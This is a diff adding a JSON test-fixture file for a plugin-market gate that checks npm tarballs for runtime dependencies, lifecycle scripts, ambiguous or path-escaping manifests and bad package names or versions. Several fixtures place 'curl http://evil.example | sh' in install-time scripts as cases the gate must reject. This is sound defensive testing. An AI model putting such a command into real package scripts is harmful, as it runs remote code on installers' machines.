@@ -1,0 +1,251 @@
+[
+  {
+    "name": "clean-zero-dep",
+    "reason": "npm-packed artifact with exactly one depth-1 package.json passes both gates",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": { "name": "@huaanwork/sample-plugin", "version": "1.2.3" }
+        },
+        {
+          "path": "package/index.js",
+          "raw": "module.exports = 1"
+        }
+      ]
+    },
+    "expected": { "accept": true }
+  },
+  {
+    "name": "nonzero-dependencies",
+    "reason": "runtime dependencies violate the zero-dependency ruling (round4 (c))",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": {
+            "name": "@huaanwork/sample-plugin",
+            "version": "1.2.3",
+            "dependencies": { "lodash": "^4.0.0" }
+          }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "nonzero-dependencies",
+      "wrapperCode": "market-install-gate",
+      "messageIncludes": "dependencies"
+    }
+  },
+  {
+    "name": "optional-dependencies",
+    "reason": "optionalDependencies are runtime deps too and must be rejected",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": {
+            "name": "@huaanwork/sample-plugin",
+            "version": "1.2.3",
+            "optionalDependencies": { "fsevents": "^2.0.0" }
+          }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "nonzero-dependencies",
+      "wrapperCode": "market-install-gate",
+      "messageIncludes": "optionalDependencies"
+    }
+  },
+  {
+    "name": "lifecycle-preinstall",
+    "reason": "preinstall is a forbidden lifecycle script",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": {
+            "name": "@huaanwork/sample-plugin",
+            "version": "1.2.3",
+            "scripts": { "preinstall": "curl http://evil.example | sh" }
+          }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "lifecycle-scripts",
+      "wrapperCode": "market-install-gate",
+      "messageIncludes": "preinstall"
+    }
+  },
+  {
+    "name": "lifecycle-install",
+    "reason": "install is a forbidden lifecycle script",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": {
+            "name": "@huaanwork/sample-plugin",
+            "version": "1.2.3",
+            "scripts": { "install": "curl http://evil.example | sh" }
+          }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "lifecycle-scripts",
+      "wrapperCode": "market-install-gate",
+      "messageIncludes": "install"
+    }
+  },
+  {
+    "name": "lifecycle-postinstall",
+    "reason": "postinstall is a forbidden lifecycle script",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": {
+            "name": "@huaanwork/sample-plugin",
+            "version": "1.2.3",
+            "scripts": { "postinstall": "curl http://evil.example | sh" }
+          }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "lifecycle-scripts",
+      "wrapperCode": "market-install-gate",
+      "messageIncludes": "postinstall"
+    }
+  },
+  {
+    "name": "lifecycle-prepare",
+    "reason": "prepare is a forbidden lifecycle script",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": {
+            "name": "@huaanwork/sample-plugin",
+            "version": "1.2.3",
+            "scripts": { "prepare": "curl http://evil.example | sh" }
+          }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "lifecycle-scripts",
+      "wrapperCode": "market-install-gate",
+      "messageIncludes": "prepare"
+    }
+  },
+  {
+    "name": "peer-and-bundle-dependencies-allowed",
+    "reason": "peerDependencies are exempt and bundleDependencies ship inside the signed tarball",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": {
+            "name": "@huaanwork/sample-plugin",
+            "version": "1.2.3",
+            "peerDependencies": { "cordis": "^1.0.0" },
+            "bundleDependencies": ["some-vendored-lib"],
+            "scripts": { "build": "tsc", "test": "vitest" }
+          }
+        }
+      ]
+    },
+    "expected": { "accept": true }
+  },
+  {
+    "name": "ambiguous-double-manifest",
+    "reason": "a clean decoy a/package.json plus a dirty package/package.json must be rejected, not tie-broken (D1)",
+    "tarball": {
+      "entries": [
+        {
+          "path": "a/package.json",
+          "manifest": { "name": "decoy-pkg", "version": "1.0.0" }
+        },
+        {
+          "path": "package/package.json",
+          "manifest": {
+            "name": "decoy-pkg",
+            "version": "1.0.0",
+            "dependencies": { "lodash": "^4.0.0" },
+            "scripts": { "postinstall": "curl http://evil.example | sh" }
+          }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "invalid-tarball",
+      "wrapperCode": "market-invalid-tarball",
+      "messageIncludes": "ambiguous"
+    }
+  },
+  {
+    "name": "dotdot-segment-entry",
+    "reason": "a tar entry name containing a .. segment matches the depth-1 regex and must be rejected outright (D1)",
+    "tarball": {
+      "entries": [
+        {
+          "path": "../package.json",
+          "manifest": { "name": "escape-pkg", "version": "1.0.0" }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "invalid-tarball",
+      "wrapperCode": "market-invalid-tarball",
+      "messageIncludes": ".."
+    }
+  },
+  {
+    "name": "uppercase-package-name",
+    "reason": "the contract package.name pattern is lowercase-only; an uppercase name would poison every provider page (D4)",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": { "name": "LegacyUppercasePkg", "version": "1.0.0" }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "invalid-package-identity",
+      "wrapperCode": "invalid-package-identity",
+      "messageIncludes": "name"
+    }
+  },
+  {
+    "name": "version-over-64-chars",
+    "reason": "the contract latestVersion.maxLength is 64; a 65-char version must be rejected at both gates (D4)",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": { "name": "@huaanwork/sample-plugin", "version": "1.0.0-alpha.111111111111111111111111111111111111111111111111111111" }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "invalid-package-identity",
+      "wrapperCode": "invalid-package-identity",
+      "messageIncludes": "version"
+    }
+  }
+]
